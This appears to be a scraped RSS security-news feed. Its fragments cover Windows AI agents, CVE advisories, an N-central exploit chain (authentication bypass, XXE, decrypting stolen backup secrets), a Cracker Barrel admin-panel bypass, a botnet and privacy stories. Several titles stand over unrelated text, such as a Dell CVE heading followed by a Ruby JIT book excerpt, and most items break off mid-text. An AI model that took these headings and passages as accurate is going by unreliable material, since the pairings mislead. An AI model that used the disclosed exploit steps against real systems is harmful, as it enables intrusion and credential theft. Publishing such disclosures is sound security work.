Agents their own backyard on your PC, and let them run in the background all the time. You’ll be able to monitor the logs and keep an eye on agent activity.Agents also need your apps, not just files or foldersWhile each agent gets its own account, independent of your personal account, an agent would  need access to your apps.Now, when you turn on the feature, Microsoft is giving access to all your installed apps that you can use. But you can specifically install apps for your agents. Or you can maintain different user accounts on Windows, and then install apps for those specific users. If this isn’t an unnecessary solution to a problem no one had, then what is…?AI Agents may have performance issuesIn our tests, Windows Latest observed that the experimental toggle warns of potential performance issues, and it makes sense.AI agents are going to run in the background all the time and use RAM or CPU, depending agent’s activity. However, Microsoft’s early benchmarks suggest they won’t really drain PCs of their power. Microsoft won’t give us the numbers for obvious reasons.Microsoft only says AI Agents will use a limited amount of RAM and CPU.By default, these agents are lightweight, but the catch is that some Agents could be resource-intensive. We’re going to find out later.Despite the AI push, Microsoft still insists it deeply cares about power usersAs Windows Latest reported recently, when Microsoft’s Windows boss teased an “Agentic” future for Windows, hundreds and thousands of users criticised the leadership. Microsoft’s executive closed the replies/comments on his post to calm the public, but the move backfired as more users started shaming Windows’ Agentic shift.Later, Microsoft’s Windows boss promised that it would make Windows better for everyone, and it deeply cares about developers.“We know we have work to do on the experience, both on the everyday usability, from inconsistent dialogs to power user experiences. When we meet as a team, we discuss these paint points and others in detail, because we want developers to choose Windows,” says Pavan Davuluri, who is the boss of Windows and devices at Microsoft.”“….I’ll boil it down, we care deeply about developers,” he added.While the Experimental Agents Feature is optional, it makes it quite obvious Microsoft will not stop investing in AI for Windows 11, and Agentic OS is the future, whether you like it or not.]]></content:encoded></item><item><title>CVE-2025-36553 - Dell ControlVault3 CvManager buffer overflow vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-36553</link><author></author><category>vulns</category><pubDate>Mon, 17 Nov 2025 23:15:54 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-36553

Microscope that covers Ruby 3.x. I'm working on this in my spare time, so it
will take a while. Leave a comment or drop
me a line and I'll email you when it's finished.Here’s an excerpt from the completely new content for Chapter 4, about YJIT and
ZJIT. I’m still finishing this up… so this content is fresh off the page! It’s
been a lot of fun for me to learn about how JIT compilers work and to brush up
on my Rust skills as well. And it’s very exciting to see all the impressive work
the Ruby team at Shopify and other contributors have done to improve Ruby’s
runtime performance.Chapter 4: Compiling Ruby To Machine LanguageInterpreting vs. Compiling Ruby CodeVirtual Machines and Actual MachinesCounting Method and Block CallsExecuting YJIT Blocks and BranchesRegenerating a YJIT BranchAdding Two Integers Using Machine LanguageExperiment 4-1: Which Code Does YJIT Optimize?Saving Multiple Block VersionsZJIT, Ruby’s Next Generation JITCounting Method and Block CallsExperiment 4-2: Reading  ZJIT HIR and LIR Counting Method and Block CallsTo find hot spots, YJIT counts how many times your program calls each function
or block. When this count reaches a certain threshold, YJIT stops your program
and converts that section of code into machine language. Later Ruby will execute
the machine language version instead of the original YARV instructions.To keep track of these counts, YJIT saves an internal counter nearby the YARV
instruction sequence for each function or block.Figure 4-5 shows the YARV instruction sequence the main Ruby compiler created
for the  block at (3) in Listing 4-1. At the
top, above the YARV instructions, Figure 4-5 shows two YJIT related values:
 and . As we’ll see in a moment,  starts as a null value but will later hold a
pointer to the machine language instructions YJIT produces for this Ruby block.
Below , Figure 4-5 also shows , YJIT’s internal counter.Each time the program in Listing 4-1 calls this block, YJIT increments the value
of . Since the range at (1) in Listing
4-1 spans from 1 through 40, this counter will start at zero and increase by 1
each time  calls the block at (3).When the  reaches a particular
threshold, YJIT will compile the YARV instructions into machine language. By
default for small Ruby programs YJIT in Ruby 3.5 uses a threshold of 30. Larger
programs, like Ruby on Rails web applications, will use a larger threshold value
of 120. (You can also change the threshold by passing  when you run your Ruby program.)While compiling your Ruby program, YJIT saves the machine language instructions
it creates into . YJIT blocks, which are distinct from Ruby blocks,
each contain a sequence of machine language instructions for a range of
corresponding YARV instructions. By grouping YARV instructions and compiling
each group into a YJIT block, YJIT can produce more optimized code that is
tailored to your program’s behavior and avoid compiling code that your program
doesn’t need.As we’ll see next, a single YJIT block doesn’t correspond to a Ruby function or
block. YJIT blocks instead represent smaller sections of code: individual YARV
instructions or a small range of YARV instructions. Each Ruby function or block
typically consists of several YJIT blocks.Let’s see how this works for our example. After the program in Listing 4-1
executes the Ruby block at (3) 29 times, YJIT will increment the  counter again, just before Ruby runs the
block for the 30th time. Since  reaches
the threshold value of 30, YJIT triggers the compilation process.YJIT compiles the first YARV instruction 
and saves machine language instructions that perform the same work as  into a new YJIT block:On the left side, Figure 4-6 shows the YARV instructions for the  Ruby block. On the right, Figure 4-6 shows the new
YJIT block corresponding to .Next, the YJIT compiler continues and compiles the second YARV instruction from
the left side of Figure 4-7:  at index 2.On the left side, Figure 4-7 shows the same YARV instructions for the  Ruby block that we saw above in Figure 4-6. But now
the two dotted arrows indicate that the YJIT block on the right contains the
machine language instructions equivalent to both  and .Let’s take a look inside this new block. YJIT compiles or translates the Ruby
YARV instructions into machine language instructions. In this example, running
on my Mac laptop, YJIT writes the following machine language instructions into
this new block:Figure 4-8 shows a closer view of the new YJIT block that appeared on the right
side of Figures 4-6 and 4-7. Inside the block, Figure 4-8 shows the assembly
language acronyms corresponding to the ARM64 machine language instructions that
YJIT generated for the two YARV instructions shown on the left. The YARV
instructions on the left are: , which
loads a value from a local variable located in the previous stack frame and
saves it on the YARV stack, and , which
loads a local variable from the current stack from and also saves it on the YARV
stack. The machine language instructions on the right side of Figure 4-8 perform
the same task, loading these values into registers on my M1 microprocessor:
 and . If you’re curious
and would like to learn more about what the machine language instructions mean
and how they work, the section “Adding Two Integers Using Machine Language”
discusses the instructions for this example in more detail.Next, YJIT continues down the sequence of YARV instructions and compiles the
 YARV instruction at index 4 in Figures 4-6
and 4-7. But this time, YJIT runs into a problem: It doesn’t know the type of
the addition arguments. That is, will  add two
integers? Or two strings, floating point numbers, or some other types?Machine language is very specific. To add two 64-bit integers on an M1
microprocessor, YJIT could use the  assembly
language instruction. But adding two floating pointer numbers would require
different instructions. And, of course, adding or concatenating two strings is
an entirely different operation altogether.In order for YJIT to know which machine language instructions to save into the
YJIT block for , YJIT needs to know exactly
what type of values the Ruby program might ever add at (3) in Listing 4-1. You
and I can tell by reading Listing 4-1 that the Ruby code is adding integers. We
know right away that the  block at (3) is
always adding one integer to another. But YJIT doesn’t know this.YJIT uses a clever trick to solve this problem. Instead of analyzing the entire
program ahead of time to determine all of the possible types of values the  YARV instruction might ever need to add, YJIT
simply waits until the block runs and observes which types the program actually
passes in.YJIT uses  to achieve this wait-and-see compile behavior, as shown
in Figure 4-9.Figure 4-9 shows the YARV instructions on the left, and the YJIT block for
indexes 0000-0002 on the right. But note the bottom right corner of Figure 4-7,
which shows an arrow pointing down from the block to a box labeled stub. This
arrow represents a YJIT branch. Since this new branch doesn’t point to a block
yet, YJIT sets up the branch to point to a branch stub instead.]]></content:encoded></item><item><title>IBM AIX Hit by Three Critical Vulnerabilities, One a Perfect 10.

This pair of vulnerabilities allow an authenticated attacker to achieve remote code execution via deserialization and command injection. Any time an authenticated vulnerability pops up in widely deployed enterprise software, it piques our interest to see if there is something more to find.During the investigation, we uncovered several other critical security issues that existed in the most up-to-date version of N-central. The issues, when combined, allow for an unauthenticated attacker to interact with legacy APIs and read sensitive files on the filesystem – including files that leak credentials and other sensitive information. In nearly all deployments, we found that the leaked credentials led to compromising the N-central database which contains all integration secrets such as domain credentials, N-central user API keys, integrated device and service API keys, SSH private keys, and more.The vulnerabilities reported were assigned:CVE-2025-9316: Authentication Bypass via Weak Authentication MethodCVE-2025-11700: Authenticated XML External Entity (XXE) Information LeakN-central is N-able’s remote managing and monitoring solution (RMM) allowing for large enterprises and MSPs to easily manage, configure, patch, and run reporting and analytics.It is not uncommon to find deployed on the internet, with approximately 3000 instances listed on Shodan. Given the recent addition N-central to the CISA KEV and threat actors commonly targeting RMM software (SimpleHelp, ConnectWise, and BeyondTrust as fairly recent examples), this is definitely a target of interest.CVE-2025-8875: Authenticated Insecure DeserializationThe pair of vulnerabilities were patched in N-central 2025.3.0.14 released 15 July 2025. Patch diffing this release with an earlier release we quickly stumble upon the insecure deserialization in both the  and LicenseReponseUnsolicited0008 classes. The class’s  method takes in a user controlled byte array, creates an  and calls  on it. This functionality is reachable via the legacy SOAP APIs on the  endpoint via the  method which calls the below ServerActivate.activate(). CVE-2025-8876: Authenticated Command InjectionThe patch included many areas of code where shell commands were constructed with user input and called via helper utilities that attempted to sanitize any user input, but not all functions utilized this helper. One such function that stood out was MotherShipMonitoringFeatureServiceImpl.activateMotherShipMonitoring(), now removed in the patch, which constructed a shell command and passed user input directly to a execution utility function.The  utility also makes no effort to sanitize user input before calling Runtime.getRuntime().execute().The activateMothershipMonitoring() method was reachable via the /dms2/services2/ServerUI2 legacy SOAP API via the mothershipMonitoringActivate API method, but has since been removed from the API entirely.Both API endpoints and vulnerable paths to the code required a valid session ID to interact with them, so the plan was to find a way to get a session ID. The patches also contained a significant amount of hardening around API Refresh and Access tokens, and it seemed like there might be something there there, but before we could suss out any insecurities, we stumbled upon the legacy SOAP API method . The  method is exposed across many of the legacy SOAP API endpoints, takes in several arguments, and passes control to SessionHello.sessionHello(). The function inspects the user controlled input, and conditionally returns a valid session ID intended for a network-peer appliance to communicate with the N-central server. Unfortunately, in the default configuration of N-central, the database comes preconfigured with several builtin appliances for which all values needed to retrieve a session ID are static and known across installs.Sending the crafted SOAP API request to the /dms/services/ServerMMS endpoint with the crafted inputs allows an attacker to retrieve a valid session ID.Fortunately for N-central, the legacy SOAP APIs scope session IDs differently for appliances versus users. This session ID, while valid for the  and  endpoints, does not work on other endpoints, such as  and 2 where the previous vulnerability was found, which expect a user session ID.This vulnerability existed both in the unpatched version and patched version (2025.3.09). After discovering this issue, we promptly reported it to N-able and was assigned CVE-2025-9316.Continuing the Hunt – Reading Lots of CodeWith a valid session ID for an appliance, we continued auditing the  and  APIs for where authenticated access might lead to some softer areas of code. Much of the code seemed less interesting, allowing the appliance to interact with the N-central database for tasking and reporting information about itself, but no code-level vulnerabilities were discovered like SQL injection or command injection. One function did stand out, , which allows writing arbitrary content to a specific file path on disk: /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.log.Coming up short on finding an abusable set of functions in the ServerMMS APIs, we began searching for other vulnerability classes like XML External Entity (XXE). Turning to grep, we reviewed every call in the API libraries that constructed XML parser objects like . One instance in XMLValidator.validateXML() creates a SAXParser instance without setting secure defaults that would disallow external entities via DTDs.The call chains discovered that utilized the vulnerable XMLValidator parser, however, all originated from the  API endpoint. When testing several ServerUI API methods with our previously obtained session ID, the server would return access denied due to the scoping issue of having an appliance session ID.But! Further inspection of all the available ServerUI methods showed that some methods do not validate the passed in session ID. To our great fortune, the call chains in the ServerUI endpoint that lead to the vulnerable XMLValidator code do not validate the session ID in any way. This XXE vulnerability was assigned CVE-2025-11700.The ServerUI endpoint we abuse is importServiceTemplateFromFile. We supply any session ID, a customer ID of 1 (exists by default), and supply a filepath to a file that exists on disk on the N-central appliance. Our limited file write discovered above now has value.Following the code path, we enter ImportServiceTemplateFromFile.importServiceTemplate(). Which in turn calls ImportServiceTemplateFromFile.doImport(). This function lightly validates that file exists, and that the XML contains a version string. Simple enough to pass validation so far.The code eventually reaches ServiceTemplateParser.parse(), which calls our vulnerable function XMLValidator.validateXML().To summarize what we’ve found so far:CVE-2025-9316 – An authentication bypass via weak authentication methodAn authenticated limited file write (not assigned a CVE)CVE-2025-11700 – An unauthenticated file-based parsing XXESend a  request to  to retrieve an appliance session IDSend an  request to  with our newly obtained session ID and a crafted base64 encoded string that becomes the XML content at the file location /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.logSend an importServiceFromTemplate request to  with an arbitrary session ID and the file path above Lets chain all these together to retrieve a file on disk.The end-to-end proof of concept exploit to leak files can be found on our GitHub.There are many files that exist on the appliance that are valuable to exfiltrate. Log files verbosely log the session IDs of other users and appliances, which can be used to directly interact with API endpoints to manage the appliance. The most valuable data resides in the N-central database, which we found is backed up at regular interval in most client environments. The backup credentials are stored in cleartext, along with server location, in the file /opt/nable/var/ncsai/etc/ncbackup.conf. The N-central backup is essentially an entire filesystem backup of the appliance, including the N-central database.Retrieving the backup via the credentials in from the XXE chain, we find that its a tar archive.The files of interest are:var/opt/n-central/tmp/ncbackup/ncbackup.binA postrges dump file that can be restoredsudo -u postgres pg_restore -d ncentral_restore var/opt/n-central/tmp/ncbackup/ncbackup.binopt/nable/etc/keystore.bcfksA password protected keystore file used in encrypting and decrypting sensitive fields (passwords, API keys, etc) in the databaseopt/nable/etc/masterPasswordThe password that protects the above keystore filePotentially crack the builtin root or admin or service account users to use over SSH (we did not try hard to crack these)Once the database is restored, sensitive fields (prefixed ) can be decrypted to reveal credentials, private SSH keys, and more.With a little Claude code magic, re-implementing the decryption logic given the cryptographic key files in the backup, we can decrypt all the secrets.We reported a handful of security issues in total, many variants of the assigned vulnerabilities, which include:Authentication bypass via the vulnerable  method was exposed across several legacy SOAP API endpoints with various different method signatures and unique code pathsXXE via the  and also importServiceTemplateFromFileA file upload path traversal variant allowing writing mostly-fixed filename writing to arbitrary locationsThe N-central appliance allows administrative users to retrieve logs from Administration Utilities -> View Logs.

Therefore, when looking at the maps in this atlas, it should come as no surprise that Korea is always shown as one country, with no reference to the other country that exists at the southern tip of the peninsula.In addition to generic maps of Korea, like any good atlas, the encyclopaedia also includes detailed maps of each of the provinces and counties that make them up. Again, it makes no distinction between north and south, maintaining that narrative of unity.When we delve into the global vision of North Korean cartography, things become even more interesting. So I’ll start simply with the world map.This North Korean world map is centred on the Pacific Ocean, which gives Korea a privileged position on the global stage. This is nothing new, but what is new is how North Korea depicts its enemies. Can you spot them?The representation of the continents is also of some interest. Apart from the idea of showing enemies in a consistent colour, I like the choice of projections. Instead of opting for the classic projections seen in Western cartography, the authors of these maps choose projections that better balance the shape and size of different countries. They take advantage of the fact that only one region of the globe needs to be represented.The encyclopaedia also includes maps of all the oceans, which also incorporate ocean current patterns.This collection would not be complete without country maps. Here, once again, we find a strong emphasis on the geopolitical situation and North Korea’s view of the world. This is consistent with the political maps of each continent, but when viewed separately, it is even more evident.First, the maps dedicated to enemies.Beyond these obvious things, there are more subtle issues that can be understood by looking at the complete list. The only country that does not have a dedicated map is Israel. In fact, Israel does not appear under that name on any map, but the territory of Israel appears as Palestine on the map of Asia and on all maps of surrounding countries. In the one for Jordan, it is also clarified that Palestine is a territory under Israeli occupation.And well, although it may not be of general interest, as most of the readers are from countries with large English population, here you can see how some of these countries are represented.If you are interested in any other map, please let me know in the comments and I can update the article.Pedro ZuritaMapoteca de pZZInstagramTikTokYouTube]]></content:encoded></item><item><title>CVE-2025-34323 - Nagios Log Server &lt; 2026R1.0.1 Local Privilege Escalation via Writable Scripts and Sudo Rules</title><link>https://cvefeed.io/vuln/detail/CVE-2025-34323</link><author></author><category>vulns</category><pubDate>Mon, 17 Nov 2025 17:48:28 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-34323

The web server account is granted passwordless sudo access to certain maintenance scripts while also being a member of a group that has write access to the directory containing those scripts. A local attacker running as the web server user can replace one of the permitted scripts with a malicious program and then execute it via sudo, resulting in arbitrary code execution with root privileges.

Nagios Log Server versions prior to 2026R1.0.1 contain an authenticated command injection vulnerability via the experimental 'Natural Language Queries' feature. Configuration values for this feature are read from the application settings and incorporated into a system command without adequate validation or restriction of special characters. An authenticated user with access to global configuration can abuse these settings to execute arbitrary operating system commands with the privileges of the web server account, leading to compromise of the Log Server host.

Aisuru is a Turbo Mirai-class IoT botnet that frequently causes record-breaking DDoS attacks by exploiting compromised home routers and cameras, mainly in residential ISPs in the United States and other countries," said Azure Security senior product marketing manager Sean Whalen."These sudden UDP bursts had minimal source spoofing and used random source ports, which helped simplify traceback and facilitated provider enforcement."Cloudflare linked the same botnet to a record-breaking 22.2 terabits per second (Tbps) DDoS attack that reached 10.6 billion packets per second (Bpps) and was mitigated in September 2025. This attack lasted only 40 seconds but was roughly equivalent to streaming one million 4K videos simultaneously.One week earlier, the XLab research division of Chinese cybersecurity company Qi'anxin attributed another 11.5 Tbps DDoS attack to the Aisuru botnet, saying that it was controlling around 300,000 bots at the time.The botnet targets security vulnerabilities in IP cameras, DVRs/NVRs, Realtek chips, and routers from T-Mobile, Zyxel, D-Link, and Linksys. As XLab researchers said, it suddenly ballooned in size in April 2025 after its operators breached a TotoLink router firmware update server and infected approximately 100,000 devices.Infosec journalist Brian Krebs reported earlier this month that Cloudflare removed multiple domains linked to the Aisuru botnet from its public "Top Domains" rankings of the most frequently requested websites (based on DNS query volume) after they began overtaking legitimate sites, such as Amazon, Microsoft, and Google.The company stated that Aisuru's operators were deliberately flooding Cloudflare's DNS service (1.1.1.1) with malicious query traffic to boost their domain's popularity while undermining trust in the rankings. Cloudflare CEO Matthew Prince also confirmed that the botnet's behavior was severely distorting the ranking system and added that Cloudflare now redacts or completely hides suspected malicious domains to avoid similar incidents in the future.In total, it blocked 21.3 million DDoS attacks targeting its customers throughout 2024, as well as another 6.6 million attacks targeting its own infrastructure during an 18-day multi-vector campaign.As MCP (Model Context Protocol) becomes the standard for connecting LLMs to tools and data, security teams are moving fast to keep these new services safe.This free cheat sheet outlines 7 best practices you can start using today.]]></content:encoded></item><item><title>The price of ChatGPT’s erotic chat? $20/month and your identity</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/the-price-of-chatgpts-erotic-chat-20-month-and-your-identity</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 17:18:52 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[To talk dirty to ChatGPT, you may soon have to show it your driver’s license.OpenAI announced last month that ChatGPT will soon offer erotica—but only for  That sounds like a clever guardrail until you realize what “verified” might mean: uploading government identification to a company that already knows your search history, your conversations, and maybe your fantasies.It’s a surreal moment for technology. The most famous AI tool in the world is turning into a porn gatekeeper. And it’s not happening in a vacuum. California just passed a law requiring age checks for app downloads. Discord’s age-verification partner was hacked this summer, exposing 70,000 government-issued IDs that are now being used for extortion. Twenty-four US states have passed similar laws. What began as an effort to keep kids off adult sites has quietly evolved into the largest digital ID system ever built. One we never voted for.The normalization of online ID checkpointsAge verification started as a moral crusade. Lawmakers wanted to protect minors from explicit material. However, every system that requires an ID online transforms into something else entirely: a surveillance checkpoint. To prove you’re an adult, you hand over the same information criminals and governments dream of having—and to a patchwork of private vendors who store it indefinitely.We’ve already seen where that leads. In the UK, after age-gating rules took effect under the Online Safety Act, one of the verification companies was breached. In the US, the AU10TIX breach exposed user data from Uber, X, and TikTok. Each time, the same story: people forced to upload passports, driver’s licenses, or selfies, only to watch that data leak.If hackers wanted to design a dream scenario for mass identity theft, this would be it. Governments legally requiring millions of adults to upload the exact documents criminals need.The irony is that none of this actually protects children. In the UK, VPN sign-ups spiked 1,400% the day the new restrictions went live. We hope that’s from adults balking at handing over personal data, but the point is any teen with a search bar can bypass an age-gate in minutes. The result isn’t a safer internet—it’s an internet that collects more data about adults while pushing kids toward sketchier, unregulated corners of the web.Parents already have better options for keeping inappropriate content at bay: device-level controls, filtered browsers, phones built for kids. None of those require turning the rest of us into walking ID tokens.Defenders like to compare online verification to showing ID at a bar. But when you flash your license to buy a beer, the cashier doesn’t scan it, store it, and build a permanent record of your drinking habits. Online verification does exactly that. Every log-in becomes another data point linking your identity to what you read, watch, and say.It’s not hard to imagine how this infrastructure expands. Today it’s porn, violence, and “mature” chatbots. Tomorrow it could be reproductive-health forums, LGBTQ+ resources, or political discussion groups flagged as “sensitive.” Once the pipes exist, someone will always find a new reason to use them.When innovation starts to feel invasiveLet’s be honest. We could all make money if we just decided to build porn machines, and that’s what this new offering from ChatGPT feels like. It didn’t take long for AI to grab a slice of the OnlyFans market. Except the price of admission isn’t only $20 a month; it’s potentially your identity and a whole lot of heartache.“Once you are asked to give certain types of information to a website, there’s no way to know what that company, who’s supposedly verifying your age, is doing with that information.” The verification process itself becomes a form of surveillance, creating detailed records of legal adult behavior that governments and cybercriminals can exploit.This is how surveillance gets normalized: one “safety” feature at a time. ChatGPT’s erotic mode will make ID-upload feel routine—a casual step before chatting with your favorite AI companion. But beneath the surface, those IDs will feed a new class of data brokers and third-party verifiers whose entire business depends on linking your real identity to everything you do online.We’ve reached the point where governments and corporations don’t need to build a single centralized database; we’re volunteering one piece at a time.ChatGPT’s latest intentions are a preview of what’s next. The internet has been drifting toward identity for years—from social logins to verified profiles—and AI is simply accelerating that shift. What used to be pockets of anonymity are becoming harder to find, replaced by a web that expects to know exactly who you are.The future of “safe” online spaces shouldn’t depend on handing over your driver’s license to an AI.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>CVE-2025-13319 - Authenticated SQL injection in API - Digi On-Prem Manager</title><link>https://cvefeed.io/vuln/detail/CVE-2025-13319</link><author></author><category>vulns</category><pubDate>Mon, 17 Nov 2025 17:15:48 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-13319

We continually strive to enrich our customer experience by collaborating closely with a wide variety of regional and global partners. Samsung's core principles of security, privacy, and user control ensure our customers have the choice to manage their personal data as they wish, with the highest level of protection possible.
The statement is a little vague, but Samsung says its standard privacy policy on data usage also applies to AppCloud. If you’re concerned about how your data is being used, you can visit the Samsung Privacy website, log in with your Samsung account, go to the  section, and select the  option.You can also disable AppCloud on your phone. To do that, open the Settings app, select , tap , and hit the  button. On some devices, the app may get re-enabled after a software update, and while that's unfortunate, you can disable it again following the same steps.For years, Samsung has shipped its Galaxy M, F, and A series smartphones in India with a little-known app called . Despite its name, AppCloud isn’t a cloud storage service. It’s essentially an app-installer that surfaces third-party app recommendations during device setup.
On new Galaxy devices in these lineups, AppCloud appears as part of the initial onboarding and forces users to choose whether they want to install certain apps before setup can be completed. You can postpone this by choosing the “later” option, but the app continues to push a persistent notification until you finish the selection process or disable it entirely. For most users, AppCloud has long been regarded as little more than nuisance bloatware, a side effect of Samsung’s need to generate revenue beyond hardware margins while competing with aggressive Chinese smartphone brands in India.
But findings by the non-profit SMEX from earlier this year suggest AppCloud may not be as harmless as once assumed.AppCloud expansion into Asian and African markets has sparked scrutinySince 2022, Samsung has also been preloading AppCloud on its A and M series phones in several West Asian and North African (WANA) markets. This rollout has triggered privacy concerns due to AppCloud’s ties to ironSource, a company founded in Israel and now owned by US-based Unity.
While AppCloud can be disabled, it is difficult to remove without root access. Furthermore, its privacy policy is not easily available online, raising questions about transparency, user consent, and what kind of data the app may collect.
ironSource itself has a controversial track record. The company previously operated an “InstallCore” program that became infamous for installing software without clear user permission and for bypassing security warnings, behavior that resulted in widespread criticism and blacklisting by several anti-malware tools.
Regional sensitivities make things more contentiousThe presence of an Israeli-origin technology component on Samsung phones in WANA countries poses additional problems. Several nations in this region legally bar Israeli companies from operating, and in light of the ongoing Israel–Palestine conflict, the preload of an app tied to such a company becomes even more contentious.
ironSource’s Aura technology, which “optimizes device experiences” by surfacing apps, content, and services directly on smartphones, has been used on Samsung devices in Europe, Russia, and Southeast Asia, and by telecom operators in the US; it also appears to do something similar to AppCloud. However, AppCloud itself is not listed anywhere on ironSource’s website, which appears to be the major cause for concern, even though the app is now owned by a US company.
While there’s no concrete evidence that AppCloud engages in questionable data practices today, the lack of an accessible privacy policy and ironSource's past reputation are causing anxiety among users.
People want Samsung to respondConsumer advocates and privacy-focused users are urging Samsung to take immediate steps, like providing a clear opt-out for AppCloud during setup, making its privacy policy public and accessible, and to stop preloading the app entirely in sensitive regions.
With concerns rising across multiple markets, Samsung will likely need to issue a statement to reassure customers. We have reached out to the company for comment and will update this story once we hear back.

After seeing them in the news so much, a thought came to mind: are they secure? I set out to find out! After poking around, I found a way to get into their rewards admin panel. Here is how I did it.The Cracker Barrel rewards currency is “pegs”. It’s named after the famous peg game. Essentially, pegs are rewards points. $1 spent = 1 peg. You can redeem your pegs online or in-store for food, drinks, etc.That’s really all there is to it. You can click the header link to learn more if you’d like.I came across an admin panel for the rewards. It is a corporate site and not a consumer site, so only Cracker Barrel employees are supposed to be able to get into it.It was a simple React JS app and you could see how the login worked by looking at :Looking closely, I saw an easy potential bypass method: setting the initial “isAuthenticated” value to true. One change in the compiled JS……and that was enough to get into the site! Sometimes it really is that simple.From here, you could manage the rewards and the associated peg values:That is pretty much it for the good stuff. Nothing sensitive was exposed and no customer data was at risk. The worst thing that could have happened would have been potential business disruption to the rewards system, or inflating your own rewards by modifying items you would then buy. No write actions were performed. While it looked possible to adjust production rewards, I opted to not test it since there’s probably a lot of rewards activity every second, so any brief change could have led to problems. It looks like they had the right idea for the auth – the code below sends an authorization token. Since I did not have one, I left it blank, so no token was sent. The API server would accept requests without a token, and that is where the vulnerability was.This time, I decided to give a third-party VDP a try that came recommended. I submitted it October 25, 2025. By the time I heard back on November 17, 2025, Cracker Barrel appeared to have noticed the vulnerability and fixed it themselves. As a result, no further action was required. It was cool to see a company proactively notice and fix a vulnerability so quickly!]]></content:encoded></item><item><title>Your coworker is tired of AI &amp;#8220;workslop&amp;#8221; (Lock and Code S06E23)</title><link>https://www.malwarebytes.com/blog/podcast/2025/11/your-coworker-is-tired-of-ai-workslop-lock-and-code-s06e23</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 15:44:24 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[This week on the Lock and Code podcast…Everything’s easier with AI… except having to correct it. In just the three years since OpenAI released ChatGPT, not only has onlife life changed at home—it’s also changed at work. Some of the biggest software companies today, like Microsoft and Google, are forwarding a vision of an AI-powered future where people don’t write their own emails anymore, or make their own slide decks for presentations, or compile their own reports, or even read their own notifications, because AI will do it for them. But it turns out that offloading this type of work onto AI has consequences.In September, a group of researchers from Stanford University and BetterUp Labs published findings from an ongoing study into how AI-produced work impacts the people who receive that work. And it turns out that the people who receive that work aren’t its biggest fans, because it’s not just work that they’re having to read, review, and finalize. It is, as the researchers called it, “workslop.”“AI generated work content that masquerades as good work, but lacks the substance to meaningfully advance a given task. It can appear in many different forms, including documents, slide decks, emails, and code. It often looks good, but is overly long, hard to read, fancy, or sounds off.”Far from an indictment on AI tools in the workplace, the study instead reveals the economic and human costs that come with this new phenomenon of “workslop.” The problem, according to the researchers, is not that people are using technology to help accomplish tasks. The problem is that people are using technology to create ill-fitting work that still requires human input, review, and correction down the line.“The insidious effect of workslop is that it shifts the burden of the work downstream, requiring the receiver to interpret, correct, or redo the work,” the researchers wrote. Today, on the Lock and Code podcast with host David Ruiz, we speak with Dr. Kristina Rapuano, senior research scientist at BetterUp Labs, about AI tools in the workplace, the potential lost productivity costs that come from “workslop,” and the sometimes dismal opinions that teammates develop about one another when receiving this type of work.“This person said, ‘Having to read through workshop is demoralizing.

Unsurprisingly, Googlehas been moving forward on the deprecation,
still without providing a solid justification on the reasons why other than
“we've been leeching off a FLOSS library for which we've finally found enough security bugs to use as an excuse”.
They do not explain why they haven't decided to fix the security issues in the library instead,
or adopt a more modern library written in a safe language, taking the opportunity to upgrade XSLT support
to a more recent, powerful and easier-to-use revision of the standard.Instead, what they do is to provide a “polyfill”, a piece of JavaScript that can allegedly used to supplant the functionality.
Curiously, however, they do  plan to ship such alternative in-browser,
which would allow a transparent transition without even a need to talk about XSLT .
No, they specifically refuse to do it, and instead are requesting anyone still relying on XSLT to
replace the invocation of the XSLT with a  invocation of the JavaScript polyfill that should replace it.This means that at least one of these two things are true:the polyfill is not, in fact, sufficient to cover all the use cases previously covered by the built-in support for XSLT,
and insofar as it's not, they (Google) do not intend to invest resources in maintaining it,
meaning that the task is being dumped on web developers
(, Google is removing a feature that is going to create
 for web developers just to provide the same functionality that they used to have from the browsers);insofar as the polyfill is sufficient to replace the XSLT support in the browser,
the policy to not ship it as a replacement confirms that the security issues in the XSLT library used in Chrome
were nothing more than excuses to give the final blow to RSS and any other XML format
that is still the backbone of an independent web.Actions, as they say, speak louder than words.
When a company claims that a service or feature they are removing can be still accessed by other means,
but do not streamline such access said alternative,
and instead require their users to do the work necessary to access it,
you can rest assured that beyond any word of support they may coat their actions with
there is a plain and direct intent at sabotaging said feature,
and you can rest assured that any of the excuses brought forward to defend the choice
are nothing but lies to cover a vested interest in sabotaging the adoption of the service or feature:
the intent is for you to  use that feature at all, because they have a financial interest in you  using it.And the best defense against that is to attack, and push the use of that feature even harder.
Do not install the polyfill.
Do not change your XML files to load it.
Instead, flood their issue tracker with requests to bring back in-browser XSLT support.
Report failed support for XSLT as a broken in browsers, because this is not a website issue.

As I have for  continued using MathML, SVG and SMIL
(sometimes even all together) despite Google's intent on their deprecation,
I will keep using XSLT, and in fact will look for new opportunities to rely on it.
At most, I'll set up an infobox warning users reading my site about their browser's potential brokenness
and inability to follow standards, just like I've done for MathML and SMIL
(you can see such infoboxes in the page I linked above).
And just like ultimately I was proven right
(after several years, Google ended up fixing both their SMIL and their MathML support in Chrome),
my expectation is that, particularly with more of us pushing through,
the standards will once again prevail.Remember: there is not technical justification for Google's choice.
This is not about a lone free software developer donating their free time to the community
and finding they do not have the mental or financial resources to provide a particular feature.
This is a trillion-dollar ad company who has been actively destroying the open web
for over a decade and finally admitting to it
as a consequence of the  push
and intentional [enshittification of web search]404mediaSearch.The deprecation of XSLT is entirely political,
fitting within the same grand scheme of the parasitic corporation killing the foundations of its own success
in an effort to grasp more and more control of it.
And the fact that the WebKit team at Apple
and the Firefox team at Mozilla
are intentioned to follow along on the same destructive path is not a counterpoint,
but rather an endorsement of the analysis,
